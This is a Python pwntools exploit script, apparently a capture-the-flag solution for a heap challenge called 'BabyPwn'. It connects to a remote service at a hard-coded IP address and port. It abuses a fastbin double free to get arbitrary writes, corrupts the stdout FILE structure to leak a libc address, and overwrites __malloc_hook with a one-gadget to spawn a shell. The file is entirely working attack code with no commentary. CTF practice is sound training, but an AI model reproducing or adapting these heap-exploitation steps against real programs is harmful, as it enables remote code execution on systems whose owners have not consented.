from pwn import *

context(os = "linux", arch = "amd64")
context.log_level = 'debug'

def add(name, length, content):
    r.send('1')
    r.sendafter('Member name:', name)
    r.sendafter('Description size:', str(length))
    r.sendafter('Description:', content)
    r.recvuntil('choice:')

def dele(index):
    r.send('2')
    r.sendafter('index:', str(index))
    r.recvuntil('choice:', timeout = 1)

#r = process('./BabyPwn')
r = remote("49.232.101.41", "9999")
r.recvuntil('choice:')

add("a" * 0x10, 0x60, "b" * 0x60)#0
add("a" * 0x10, 0x60, "b" * 0x60)#1
dele(0)
dele(1)
dele(0)
add("a" * 0x10, 0x60, p64(0x60201d))#2
add("a" * 0x10, 0x60, p64(0))#3
add("a" * 0x10, 0x60, p64(0))#4
add("a" * 0x10, 0x60, "a" * 3 + p64(0) + p64(0x71) + "\xdd")#5
dele(0)
dele(1)
dele(0)
add("a" * 0x10, 0x60, p64(0x60203d))#6
add("a" * 0x10, 0x60, p64(0))#7
add("a" * 0x10, 0x60, p64(0))#8
add("a" * 0x10, 0x60, p64(0) * 0xc)#9

add("a" * 0x10, 0x60, "b" * 0x60)#0
add("a" * 0x10, 0x60, "b" * 0x60)#1
dele(0)
dele(1)
dele(0)
add("a" * 0x10, 0x60, p64(0x602030))#2
add("a" * 0x10, 0x60, p64(0))#3
add("a" * 0x10, 0x60, p64(0))#4
add("a" * 0x10, 0x60, p64(0) * 0x2 + p64(0x71) + p64(0) * 0x9)#5

r.send('1')
r.sendafter('Member name:', "a" * 0x10)
r.sendafter('Description size:', str(0x60))
r.sendafter('Description:', "a" * 3 + p64(0) * 6 + p64(0xfbad3887) + p64(0) * 3 + p8(0x88))
libc = u64(r.recv()[:8]) - 0x3c48e0
#0

add("a" * 0x10, 0x60, "b" * 0x60)#1
add("a" * 0x10, 0x60, "b" * 0x60)#2
dele(2)
dele(1)
dele(2)
add("a" * 0x10, 0x60, p64(0x602048))#3
add("a" * 0x10, 0x60, p64(0))#4
add("a" * 0x10, 0x60, p64(0))#5
add("a" * 0x10, 0x60, p64(0) * 0xc)#6

add("a" * 0x10, 0x60, "b" * 0x60)#0
add("a" * 0x10, 0x60, "b" * 0x60)#1
dele(0)
dele(1)
dele(0)
add("a" * 0x10, 0x60, p64(libc + 0x3c4b10 - 0x23))#2
add("a" * 0x10, 0x60, p64(0))#3
add("a" * 0x10, 0x60, p64(0))#4
add("a" * 0x10, 0x60, "0" * 0x13 + p64(libc + 0xf02a4))#5

dele(0)
r.send('2')
r.sendafter('index:', str(0))

#gdb.attach(r)
print "libc: " + hex(libc)

r.interactive()